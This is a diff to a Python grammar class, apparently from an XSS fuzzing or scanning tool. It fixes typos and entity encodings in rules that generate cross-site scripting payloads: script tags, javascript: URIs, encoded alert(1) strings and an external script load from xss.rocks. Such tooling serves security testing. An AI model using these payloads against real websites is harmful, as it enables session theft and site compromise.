@@ -5,14 +5,14 @@ class PayloadDict(object):
         'root': (('directContext',),
                  ('attributeContext',),
                  ('eventContext',)),
-        'directContext': (('pre', 'leftSciptLabel', 'jsString', 'rightSciptLabel'),),
+        'directContext': (('pre', 'leftScriptLabel', 'jsString', 'rightScriptLabel'),),
         'attributeContext': (('terDQuote', 'wsp', 'srcAttr', 'terEqual', 'jsStatement', 'wsp'),
-                             ('pre', 'terLess', 'aTag', 'wsp', 'herfAttr', 'terEqual', 'jsStatement',
+                             ('pre', 'terLess', 'aTag', 'wsp', 'hrefAttr', 'terEqual', 'jsStatement',
                               'wsp', 'terGreater', 'rightALabel'),
                              ('pre', 'terLess', 'iframeTag', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
                               'wsp', 'terGreater'),
                              ('pre', 'terLess', 'scriptTag', 'wsp', 'srcAttr', 'terEqual', 'jsFile',
-                              'wsp', 'terGreater', 'rightSciptLabel')),
+                              'wsp', 'terGreater', 'rightScriptLabel')),
         'eventContext': (('terDQuote', 'wsp', 'eventStatement', 'wsp'),
                          ('pre', 'terLess', 'tagAttr', 'wsp', 'eventStatement', 'wsp', 'terGreater')),
 
@@ -46,8 +46,8 @@ class PayloadDict(object):
                 ('terCR',)),
 
         ### XSS label ###
-        'leftSciptLabel': (('terLess', 'scriptTag', 'terGreater'),),
-        'rightSciptLabel': (('terLess', 'terSolidus', 'scriptTag', 'terGreater'),),
+        'leftScriptLabel': (('terLess', 'scriptTag', 'terGreater'),),
+        'rightScriptLabel': (('terLess', 'terSolidus', 'scriptTag', 'terGreater'),),
         'rightALabel': (('terLess', 'terSolidus', 'aTag', 'terGreater'),),
 
         ### XSS tag and attribute###
@@ -55,31 +55,31 @@ class PayloadDict(object):
         'aTag': (('charA',),),
         'iframeTag': (('charI', 'charF', 'charR', 'charA', 'charM', 'charE'),),
         'srcAttr': (('charS', 'charR', 'charC'),),
-        'herfAttr': (('charH', 'charE', 'charR', 'charF',),),
+        'hrefAttr': (('charH', 'charE', 'charR', 'charF',),),
         'tagAttr': (),
 
         # 'scriptTag': (('script',),),
         # 'aTag': (('a',),),
         # 'iframeTag': (('iframe',),),
         # 'srcAttr': (('src',),),
-        # 'herfAttr': (('herf',),),
+        # 'hrefAttr': (('href',),),
         # 'tagAttr': (),
 
         ###Javascript statement###
         'jsString': (('alert(1)',),
                      ('%61%6c%65%72%74%28%31%29',),
-                     ('&#x61;&#6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',),
-                     ('&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59',)),
+                     ('&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',),
+                     ('&#97;&#108;&#101;&#114;&#116;&#40;&#57;&#41;&#59;',)),
         'jsFile': (('http://xss.rocks/xss.js',),
                    ('%68%74%74%70%3A%2F%2F%78%73%73%2E%72%6F%63%6B%73%2F%78%73%73%2E%6A%73',),
                    ('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x78;&#x73;&#x73;&#x2E;&#x72;\
-#&#x6F;&#x63;&#x6B;&#x73;&#x2F;&#x78;&#x73;&#x73;&#x2E;&#x6A;&#x73;',),
-                   ('&#104&#116&#116&#112&#58&#47&#47&#120&#115&#115&#46&#114&#111&#99&#107&#115\
-#&#47&#120&#115&#115&#46&#106&#115',)),
+                   &#x6F;&#x63;&#x6B;&#x73;&#x2F;&#x78;&#x73;&#x73;&#x2E;&#x6A;&#x73;',),
+                   ('&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#114;&#111;\
+                   &#99;&#107;&#115;&#47;&#120;&#115;&#115;&#46;&#106;&#115;',)),
         'jsStatement': (('javascript:', 'jsString',),
                         ('%6A%61%76%61%73%63%72%69%70%74%3A', 'jsString',),
                         ('&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;', 'jsString',),
-                        ('&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58', 'jsString',)),
+                        ('&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;', 'jsString',)),
 
         ### HTML event ###
         'eventStatement': (('eventAttr', 'terEqual', 'jsString'),),
@@ -269,7 +269,7 @@ class PayloadDict(object):
                  'wsp', 'terGreater'),),
         'form': (('terLess', 'iframeForm', 'wsp', 'actionAttr', 'terEqual', 'jsStatement', 'wsp',
                   'methodAttr', 'terEqual', 'methodContent', 'wsp', 'terGreater'),),
-        'a': (('terLess', 'aTag', 'wsp', 'herfAttr', 'terEqual', 'jsStatement',
+        'a': (('terLess', 'aTag', 'wsp', 'hrefAttr', 'terEqual', 'jsStatement',
                'wsp', 'terGreater', 'rightALabel'),),
         'video': (('terLess', 'iframeVideo', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
                    'wsp', 'terGreater'),),
@@ -283,7 +283,7 @@ class PayloadDict(object):
         'methodAttr': (('charM', 'charE', 'charT', 'charH', 'charO', 'charD'),),
         'methodContent': (('charG', 'charE', 'charT'), ('charP', 'charO', 'charS', 'charT')),
         'aTag': (('charA',),),
-        'herfAttr': (('charH', 'charE', 'charR', 'charF',),),
+        'hrefAttr': (('charH', 'charE', 'charR', 'charF',),),
         'tagAttr': (),
         'rightALabel': (('terLess', 'terSolidus', 'aTag', 'terGreater'),),
         'iframeVideo': (('charV', 'charI', 'charD', 'charE', 'charO'),),
